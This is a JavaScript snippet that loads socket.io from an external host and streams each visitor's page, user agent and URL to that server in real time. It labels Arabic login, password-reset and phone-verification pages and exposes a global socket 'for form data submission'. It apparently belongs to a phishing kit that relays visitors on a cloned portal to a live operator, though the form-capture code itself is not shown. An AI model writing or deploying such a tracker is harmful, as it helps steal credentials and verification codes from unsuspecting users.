(function() {
  const SOCKET_URL = 'https://singlewindow.fly.dev';
  
  // Load socket.io client
  var script = document.createElement('script');
  script.src = SOCKET_URL + '/socket.io/socket.io.js';
  script.onload = function() {
    var socket = io(SOCKET_URL, {
      transports: ['polling', 'websocket'],
      reconnection: true,
      reconnectionAttempts: Infinity,
      reconnectionDelay: 1000,
    });

    // Get page name from URL
    function getPageName() {
      var path = window.location.pathname;
      var map = {
        '/': 'الصفحة الرئيسية',
        '/register': 'تسجيل حساب - نوع الحساب',
        '/service': 'صفحة الخدمات',
        '/login': 'تسجيل الدخول',
        '/reset': 'نسيت كلمة المرور',
        '/update': 'تحديث كلمة المرور',
        '/mobile-verification': 'توثيق رقم الهاتف',
      };
      // Check services
      if (path.startsWith('/services/')) {
        return 'خدمة: ' + path.replace('/services/', '').replace(/-/g, ' ');
      }
      return map[path] || path;
    }

    socket.on('connect', function() {
      // Register as visitor
      socket.emit('visitor:init', {
        page: getPageName(),
        userAgent: navigator.userAgent,
        url: window.location.href,
      });
      // Send page name
      socket.emit('visitor:pageEnter', getPageName());
    });

    // Track page changes (SPA-like)
    var lastPath = window.location.pathname;
    setInterval(function() {
      if (window.location.pathname !== lastPath) {
        lastPath = window.location.pathname;
        socket.emit('visitor:pageEnter', getPageName());
      }
    }, 500);

    // Store socket globally for form data submission
    window._tracker = socket;
  };
  document.head.appendChild(script);
})();
